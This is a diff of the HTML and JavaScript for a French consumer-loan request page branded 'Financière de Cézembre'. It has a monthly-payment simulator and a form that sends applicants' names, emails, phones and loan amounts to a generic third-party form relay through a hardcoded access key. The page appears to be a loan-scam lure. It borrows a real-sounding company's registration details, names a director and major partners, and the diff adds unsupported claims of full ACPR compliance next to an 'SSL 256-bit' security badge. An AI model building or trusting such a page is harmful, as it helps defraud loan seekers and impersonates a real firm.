@@ -37,7 +37,6 @@
         .hero-content { max-width: 600px; }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
         
-        /* SIMULATEUR */
         .simulator {
             background: var(--white); padding: 40px; border-radius: 2px; width: 480px;
             box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy);
@@ -50,7 +49,6 @@
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .btn-main:hover { background: var(--gold); }
 
-        /* Formulaire étape 2 */
         .form-input { width: 100%; padding: 12px; border: 1px solid #DDD; border-radius: 4px; margin-bottom: 10px; font-size: 0.9rem; }
         .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
 
@@ -113,7 +111,6 @@
             <h3 style="margin-bottom: 20px;">Finaliser votre demande</h3>
             <form action="https://api.web3forms.com/submit" method="POST" id="loanForm">
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
-                <input type="hidden" name="subject" value="Nouvelle demande de prêt - Cézembre">
                 
                 <input type="hidden" name="montant_client" id="hiddenAmt">
                 <input type="hidden" name="duree_client" id="hiddenDur">
@@ -121,16 +118,16 @@
 
                 <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
                 <select name="projet" class="form-input" required>
-                    <option value="" disabled selected>Type de projet</option>
+                    <option value="" disabled selected>Choisir votre projet</option>
                     <option value="Personnel">Prêt Personnel</option>
                     <option value="Auto">Auto / Moto</option>
-                    <option value="Travaux">Travaux</option>
-                    <option value="Consommation">Autre besoin</option>
+                    <option value="Travaux">Travaux / Rénovation</option>
+                    <option value="Rachat">Rachat de crédit</option>
                 </select>
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
-                <input type="tel" name="telephone" placeholder="Téléphone" class="form-input" required>
+                <input type="tel" name="telephone" placeholder="Numéro de téléphone" class="form-input" required>
 
-                <button type="submit" class="btn-main">ENVOYER LA DEMANDE</button>
+                <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
                 
                 <div class="security-tag">
                     <i class="fas fa-lock"></i> Transfert sécurisé SSL 256-bit
@@ -150,7 +147,7 @@
 <section class="about-section" id="about">
     <h2>Une Institution de Référence</h2>
     <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
-    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen.</p>
+    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen. Notre engagement repose sur la transparence, le respect scrupuleux de la convention collective des établissements financiers et une conformité totale aux directives de l'ACPR.</p>
 </section>
 
 <footer id="legal">
@@ -193,7 +190,6 @@
     const durT = document.getElementById('durText');
     const resM = document.getElementById('monthlyRes');
 
-    // Mise à jour du calcul
     function calc() {
         let p = parseFloat(amtR.value);
         let n = parseInt(durR.value);
@@ -203,13 +199,11 @@
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
         resM.innerText = m.toFixed(2);
         
-        // On pré-remplit les champs cachés pour le mail
         document.getElementById('hiddenAmt').value = p + " €";
         document.getElementById('hiddenDur').value = n + " mois";
         document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
     }
 
-    // Basculer vers l'étape 2
     function goToStep2() {
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
@@ -220,13 +214,11 @@
     window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
     calc();
 
-    // Envoi via Web3Forms
     const form = document.getElementById('loanForm');
     form.onsubmit = async (e) => {
         e.preventDefault();
         const status = document.getElementById('formStatus');
         status.innerHTML = "Envoi en cours...";
-
         const formData = new FormData(form);
         const object = Object.fromEntries(formData);
         const json = JSON.stringify(object);
@@ -239,11 +231,11 @@
 
         if (response.status == 200) {
             status.style.color = "green";
-            status.innerHTML = "Demande envoyée ! Nous reviendrons vers vous.";
+            status.innerHTML = "Demande envoyée avec succès !";
             form.reset();
         } else {
             status.style.color = "red";
-            status.innerHTML = "Erreur. Veuillez réessayer.";
+            status.innerHTML = "Erreur lors de l'envoi.";
         }
     };
 </script>
